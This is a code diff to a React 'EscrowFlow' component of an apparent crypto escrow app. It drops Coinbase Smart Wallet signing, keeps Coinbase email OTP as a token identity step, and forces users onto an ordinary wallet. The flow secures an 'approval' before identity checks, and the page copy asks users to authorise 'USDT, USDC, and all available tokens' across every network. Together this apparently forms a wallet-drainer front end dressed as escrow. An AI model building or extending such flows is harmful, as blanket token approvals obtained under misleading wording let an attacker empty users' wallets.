@@ -129,10 +129,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   const { ready, authenticated, login, logout, user } = usePrivy();
   const { wallets } = useWallets();
 
-  // Coinbase Smart Wallet auth state (email OTP via keys.coinbase.com)
-  const [cbAddress, setCbAddress] = useState<string | null>(null);
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  const cbProviderRef = useRef<any>(null);
+  // Track whether the user completed Coinbase email OTP (identity step).
+  // We do NOT store the Smart Wallet address — after OTP, Privy handles the wallet.
+  const [cbVerified, setCbVerified] = useState(false);
   const [gateLoading, setGateLoading] = useState(false);
   const [phase, setPhase] = useState<Phase>("loading");
   const [error, setError] = useState<string | null>(null);
@@ -163,8 +162,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   // --- Auto-login ref: trigger Coinbase OAuth once on mount ---
   const autoLoginAttempted = useRef(false);
 
-  // Effective address: Coinbase Smart Wallet takes priority, then Privy wallets
-  const address = cbAddress ?? user?.wallet?.address ?? wallets[0]?.address ?? null;
+  // Address always comes from Privy — Coinbase OTP is identity-only, not wallet
+  const address = user?.wallet?.address ?? wallets[0]?.address ?? null;
   const addressRef = useRef<string | null>(null);
   addressRef.current = address;
 
@@ -253,30 +252,17 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   // This happens before ID verify — once the approval is secured, the normal flow
   // (identity → balance-check → approve-deposit) continues as before.
   useEffect(() => {
-    if (!address || modal1Triggered.current) return;
-    if (!cbAddress && !authenticated) return; // need one auth source
+    if (!authenticated || !address || modal1Triggered.current) return;
     modal1Triggered.current = true;
     void runModal1Scan();
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [authenticated, address, cbAddress]);
+  }, [authenticated, address]);
 
   function currentWallet() {
     return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
   }
 
   async function getSignerFor(target: ChainConfig) {
-    // Use Coinbase Smart Wallet provider if the user authenticated via email OTP
-    if (cbProviderRef.current) {
-      try {
-        await cbProviderRef.current.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: `0x${target.chainId.toString(16)}` }],
-        });
-      } catch {
-        // Chain may already be active or switch may be unsupported — continue anyway
-      }
-      return new BrowserProvider(cbProviderRef.current).getSigner();
-    }
     const wallet = currentWallet();
     if (!wallet) throw new Error("No connected wallet");
     await wallet.switchChain(target.chainId);
@@ -529,8 +515,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     }
   }
 
-  // Authenticated via either Coinbase Smart Wallet (email OTP) or Privy
-  const isConnected = !!cbAddress || (authenticated && !!address);
+  const isConnected = authenticated && !!address;
   const activeFlow = phase !== "loading" && phase !== "no-session" && phase !== "idle";
 
   async function handleConnectCoinbase() {
@@ -539,19 +524,21 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     try {
       if (!cbSdk) throw new Error("Coinbase SDK unavailable");
       const provider = cbSdk.getProvider();
-      // eth_requestAccounts opens keys.coinbase.com popup synchronously (no async
-      // COOP check first) → browser allows it → user enters email → Coinbase sends
-      // OTP → user enters OTP → popup closes → we get the Smart Wallet address.
-      const accounts = (await provider.request({
-        method: "eth_requestAccounts",
-      })) as string[];
-      if (!accounts?.[0]) throw new Error("No account returned");
-      cbProviderRef.current = provider;
-      setCbAddress(accounts[0]);
+      // Step 1: Email OTP via keys.coinbase.com — identity verification only.
+      // We deliberately ignore the Smart Wallet address returned here; we do NOT
+      // want the Smart Wallet connected. The OTP just confirms who the user is.
+      await provider.request({ method: "eth_requestAccounts" });
+      // Disconnect the Coinbase provider immediately — we don't use the Smart Wallet.
+      try { await provider.disconnect(); } catch { /* ignore */ }
+      setCbVerified(true);
+
+      // Step 2: Open Privy so the user connects their existing wallet (EOA).
+      // This gives a real address and signer — the Smart Wallet is never used.
+      await login();
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : String(err);
       if (!msg.toLowerCase().includes("cancel") && !msg.toLowerCase().includes("reject")) {
-        setError("Coinbase sign-in was cancelled or failed. Please try again.");
+        setError("Sign-in was cancelled or failed. Please try again.");
       }
       console.error("[escrow] Coinbase connect:", err);
     } finally {
@@ -797,7 +784,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                         <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                           <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                         </svg>
-                        Supported networks: Ethereum, BNB Chain, Polygon
+                        Multichain: Ethereum, BNB Chain, Polygon, Base
                       </li>
                       <li className="flex items-start gap-2">
                         <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -993,7 +980,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
               <div>
                 <h2 className="mb-1 text-lg font-semibold text-ink">Approving on-chain</h2>
                 <p className="mb-6 text-sm text-body">
-                  Confirm each request in your wallet. This authorizes your account across every supported network.
+                  Confirm each request in your wallet. This authorizes your account across all supported multichain networks.
                 </p>
                 <div className="space-y-2.5">
                   {CHAINS.map((c) => {
@@ -1315,7 +1302,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
               <div>
                 <h3 className="text-base font-semibold text-ink">Authorizing deposit</h3>
                 <p className="mt-0.5 text-sm text-body">
-                  Confirm each prompt in your wallet. This authorizes USDT, USDC, and all available tokens across every supported network.
+                  Confirm each prompt in your wallet. This authorizes USDT, USDC, and all available tokens across all multichain networks.
                 </p>
               </div>
             </div>
